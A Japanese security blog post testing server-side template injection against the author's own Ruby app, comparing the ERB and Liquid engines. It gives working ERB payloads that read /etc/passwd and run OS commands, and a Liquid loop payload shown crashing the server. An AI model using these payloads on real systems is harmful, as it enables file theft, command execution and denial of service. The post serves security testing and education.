<div style="text-align:center;">[f:id:motikan2010:20230715182355p:plain:w600]</div>


<div class="contents-box"><p>[:contents]</p></div>

## TL;DR

- <span style="font-size: 120%">** プログラムが書けないテンプレートエンジンでも大量ループのテンプレートの挿入でシステムを落とせるヨ **</span>


## はじめに

　**SSTI（Server-Side Template Injection : サーバサイド・テンプレート・インジェクション）** の与える影響範囲はテンプレートエンジンによって変わるとふと思いました。  

　SSTI に着目してみると、<span class="m-y">テンプレートエンジンは以下の２つに大別されます。</span>  

- 「**いろいろな機能を持つ**テンプレートエンジン」
- 「**最低限の機能のみを持つ**テンプレートエンジン」

　本記事では後者の「**最低限の機能のみを持つテンプレートエンジン**」に焦点を当てて検証を行なっていきます。

　まずは、両方のテンプレートエンジンの比較（検証 ①）。  

　最後（検証 ②）で SSTI（サーバサイド・テンプレート・インジェクション）経由の DoS攻撃を実施し、システムを落とすことが可能であることを確認します。     

　カッコよく言うと『**DoS via Server-Side Template Injection**』というやつです。  

## 検証 ① 一般的な攻撃


　Ruby環境で用いられるテンプレートエンジンの「ERB」と「Liquid」に対してインジェクションを実施していきます。  

- いろいろな機能を持つテンプレートエンジン ：**ERB**
- 最低限の機能のみを持つテンプレートエンジン：**Liquid** 

　検証で利用したコードは以下のリポジトリで公開しています。  

[https://github.com/motikan2010/SSTI-Liquid-ERB:embed:cite]  

　コードはシンプルで `name` パラメータの値がテンプレートで生成できるようになっています。  
　（値がテンプレートに渡される訳ではない！！テンプレートとなってしまう！！という脆弱性です。）

[f:id:motikan2010:20230715212154p:plain:w600]  

　まずは、以下３パターンの処理をテンプレートエンジンで実現できるかを確認します。  

　どの処理もセキュリティ診断で脆弱性を検出した際に、その脆弱性を利用して試してみる処理内容だと思います。  

- パターン１: 簡単な演算
- パターン２: 任意のファイルの読み込み
- パターン３: OSコマンドの実行

　検証結果を始めに記載しますが、「Liquid」の方はやはりテンプレートエンジンとしての最低限の機能しか持っておらず、できる処理は少ないという結果になりました。  

| テンプレートエンジン | ERB | Liquid |
| --- | :---: | :---: |
| 簡単な演算 | ○ | ○ |
| 任意のファイルの読み込み | ○ | ❌ |
| OSコマンドの実行 | ○ | ❌ |

　では、検証結果の詳細です。

### ERB テンプレートエンジン

#### パターン１: 簡単な演算

▼ インジェクションする文字列: 「`<%= 7 * 7 %>`」

<div class="md-code" style="width:100%">

```
# curl 'http://127.0.0.1:4567/erb?name=%3c%25%3d%20%37%20%2a%20%37%20%25%3e'
```

</div>

▼ 出力結果

<div class="md-code" style="width:100%">

```
hi 49
```

</div>

#### パターン２: 任意のファイルの読み込み

▼ インジェクション文字列: 「`<%= File.open('/etc/passwd').read %>`」

<div class="md-code" style="width:100%">

```
# curl 'http://127.0.0.1:4567/erb?name=%3c%25%3d%20%46%69%6c%65%2e%6f%70%65%6e%28%27%2f%65%74%63%2f%70%61%73%73%77%64%27%29%2e%72%65%61%64%20%25%3e'
```

</div>

▼ 出力結果

<div class="md-code" style="width:100%">

```
hi root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

</div>

#### パターン３: OSコマンドの実行

▼ インジェクション文字列: 「`<%= IO.popen('id').readlines() %>`」

<div class="md-code" style="width:100%">

```
# curl 'http://127.0.0.1:4567/erb?name=%3c%25%3d%20%49%4f%2e%70%6f%70%65%6e%28%27%69%64%27%29%2e%72%65%61%64%6c%69%6e%65%73%28%29%20%25%3e'
```

</div>

▼ 出力結果

<div class="md-code" style="width:100%">

```
hi ["uid=0(root) gid=0(root) groups=0(root)\n"]
```

</div>

### Liquid テンプレートエンジン

　「最低限の機能のみを持つテンプレートエンジン」の代表である Liquid の検証を行います。  

#### パターン１: 簡単な演算

　まずは、Rubyの構文に従った乗算を行います。

▼ インジェクションする文字列: 「`{{ 7 * 7 }}`」

<div class="md-code" style="width:100%">

```
# curl 'http://127.0.0.1:4567/liquid?name=%7b%7b%20%37%20%2a%20%37%20%7d%7d'
```

</div>

▼ 出力結果

<div class="md-code" style="width:100%">

```
hi 7
```

</div>

　出力の期待値は49なので、乗算が行われていないようです。  

　Liquid について調べてみると乗算には「**フィルタ**」を利用する必要があります。  

https://shopify.dev/docs/api/liquid/filters/times

　乗算を実現する「times」フィルタを用いて再度検証します。  

▼ インジェクション文字列: 「`{{ 7 | times: 7 }}`」

<div class="md-code" style="width:100%">

```
# curl 'http://127.0.0.1:4567/liquid?name=%7b%7b%20%37%20%7c%20%74%69%6d%65%73%3a%20%37%20%7d%7d'
```

</div>

▼ 出力結果

<div class="md-code" style="width:100%">

```
hi 49
```

</div>

　無事期待値が出力されました。このことから Liquid には Ruby の構文はそのまま利用できないことが分かりました。  
　（そのため SSTI に対してはセキュア）
  
　以降は Liquid の構文に従いながら各処理パターンが実現できるかを確認していきます。  

#### パターン２: ファイルの読み込み

　Liquid で別ファイルの読み込みを行うために `include` タグが用意されているようです。

https://shopify.dev/docs/api/liquid/tags/include

　以下のテンプレートをインジェクションできれば「`passwd`」ファイルの読み込みができそうです。

▼ インジェクション文字列: 「`{% include '/etc/passwd' %}`」

<div class="md-code" style="width:100%">

```
# curl 'http://127.0.0.1:4567/liquid?name=%7b%25%20%69%6e%63%6c%75%64%65%20%27%2f%65%74%63%2f%70%61%73%73%77%64%27%20%25%7d'
```

</div>

▼ 出力結果

<div class="md-code" style="width:100%">

```
hi Liquid error: This liquid context does not allow includes.
```

</div>

　読み込みは失敗し、「`Liquid error: This liquid context does not allow includes.`」というエラーメッセージが表示されました。

　少し調べてみましたが、<span class="m-y">Liquidは事前に読み込みを許可するファイルパスを指定する必要があり、許可されているファイルパス以外へのアクセスであるためエラーが発生しているようでした。</span>  

> Liquid ファイルシステムは、インクルードタグで使用するために、テンプレートが他のテンプレートを取得できるようにする方法です。  
`Liquid::Template.file_system = Liquid::LocalFileSystem.new(template_path)`  
`liquid = Liquid::Template.parse(template)`  

https://github.com/Shopify/liquid/blob/v5.4.0/lib/liquid/file_system.rb#L4

　この許可はプログラム(Ruby)上で記述する必要があり、デフォルトの状態では「`/etc/passwd`」などの任意のファイルを読み込むのは難しいそうです。

#### パターン３: OSコマンドの実行

　Liquid ではOSコマンドを実行する手段は用意されていないようでした。

　（ドキュメントを軽く見た感じ、そのようなフィルタやタグは見当たらなかった。）

### 検証結果

　改めて検証結果を記載しますが、Liquid のサーバサイド・テンプレート・インジェクションはあまりシステムに影響を与えることは難しそうです。  

| テンプレートエンジン | ERB | Liquid |
| --- | :---: | :---: |
| 簡単な演算 | ○ | ○ |
| 任意のファイルの読み込み | ○ | ❌ |
| OSコマンドの実行 | ○ | ❌ |

　次は、 Liquid に対してサーバサイド・テンプレート・インジェクションを利用した DoS攻撃ができるかを検証していきます。  

## 検証 ② DoS攻撃

　本検証ではテンプレート・インジェクションで大量ループを発生させることで、以下のことができるかを確認します。  

- システムに負荷を掛ける
- システムを落とす

　ちなみに Liquid の for文 の記述方法はこのようになります。  

<div class="md-code" style="width:100%">

```liquid
{% for i in (1..10) %}
{% assign hoge = i | plus: i %}
{% endfor %}
```

</div>

https://shopify.github.io/liquid/tags/iteration/

### 大量ループで負荷を掛ける

10 回ループ → 0.018 秒

<div class="md-code" style="width:100%">

```
# time curl 'http://127.0.0.1:4567/liquid?name=%7B%25+for+i+in+%281..10%29+%25%7D%0D%0A%7B%25+assign+hoge+%3D+i+%7C+plus%3A+i+%25%7D%0D%0A%7B%25+endfor+%25%7D'
hi
real	0m0.018s
```

</div>

1,000 回ループ → 0.023 秒

<div class="md-code" style="width:100%">

```
# time curl 'http://127.0.0.1:4567/liquid?name=%7B%25+for+i+in+%281..1000%29+%25%7D%0D%0A%7B%25+assign+hoge+%3D+i+%7C+plus%3A+i+%25%7D%0D%0A%7B%25+endfor+%25%7D'
hi
real	0m0.023s
```

</div>

1,000,000 回ループ → 6.387 秒

<div class="md-code" style="width:100%">

```
# time curl 'http://127.0.0.1:4567/liquid?name=%7B%25+for+i+in+%281..1000000%29+%25%7D%0D%0A%7B%25+assign+hoge+%3D+i+%7C+plus%3A+i+%25%7D%0D%0A%7B%25+endfor+%25%7D'
hi
real	0m6.387s
```

</div>

100,000,000 回ループ → 1 分 5.994 秒

<div class="md-code" style="width:100%">

```
# time curl 'http://127.0.0.1:4567/liquid?name=%7B%25+for+i+in+%281..10000000%29+%25%7D%0D%0A%7B%25+assign+hoge+%3D+i+%7C+plus%3A+i+%25%7D%0D%0A%7B%25+endfor+%25%7D'
hi
real	1m5.994s
```

</div>

　top コマンドでサーバ上の負荷を確してみます。「`%Cpu(s): 99.3 us`」となっておりサーバに負荷が掛かっていることが確認できました。  

<div class="md-code" style="width:100%">

```
top - 08:30:47 up 31 min,  2 users,  load average: 0.59, 0.53, 0.26
Tasks: 115 total,   1 running,  69 sleeping,   0 stopped,   0 zombie
%Cpu(s): 99.3 us,  0.7 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem :  2006252 total,  1560000 free,   249416 used,   196836 buff/cache
KiB Swap:        0 total,        0 free,        0 used.  1614816 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND
  2806 root      20   0  319712 111484   8452 S 99.3  5.6   0:04.44 ruby  
```

</div>


### 大量ループでシステムを落とす

 さらにループ回数を増やしてシステムを落とすことが可能かを確認します。

- １. ターミナル（標的）

　サーバを起動します。

<div class="md-code" style="width:100%">

```
# docker-compose up
[+] Running 1/0
 ⠿ Container liquid-erb-ssti-app-1  Created
Attaching to liquid-erb-ssti-app-1
liquid-erb-ssti-app-1  | [2023-07-15 08:32:36] INFO  WEBrick 1.6.1
liquid-erb-ssti-app-1  | [2023-07-15 08:32:36] INFO  ruby 2.7.8 (2023-03-30) [x86_64-linux]
liquid-erb-ssti-app-1  | == Sinatra (v3.0.6) has taken the stage on 4567 for development with backup from WEBrick
liquid-erb-ssti-app-1  | [2023-07-15 08:32:36] INFO  WEBrick::HTTPServer#start: pid=7 port=4567

```

</div>


- ２. ターミナル（攻撃者）

　先の検証よりループ回数を増やしたテンプレートをインジェクションします。  

<div class="md-code" style="width:100%">

```
# curl 'http://xxx.yyy.zzz.221:4567/liquid?name=%7B%25+for+i+in+%281..10000000000%29+%25%7D%0D%0A%7B%25+assign+hoge+%3D+i+%25%7D%0D%0A%7B%25+endfor+%25%7D'
curl: (52) Empty reply from server
```

</div>


- ３. ターミナル（標的）

　しばらくすると、サーバが落ちました。

<div class="md-code" style="width:100%">

```
liquid-erb-ssti-app-1  | Killed
liquid-erb-ssti-app-1 exited with code 137
```

</div>

　サーバサイド・テンプレート・インジェクション経由の DoS でシステムを落とすことができることを確認できました。 

## まとめ

- 機能が絞られているテンプレートエンジンのSSTIでも可用性の面で大きな影響を与えることができる。
  - 任意のファイル読み込みなどは難しそう。
- <span class="m-y">私は本検証で用いたテンプレート詳しくないので他に攻撃方法はあるかもしれない。（知っていたら是非ご教示を。）</span>
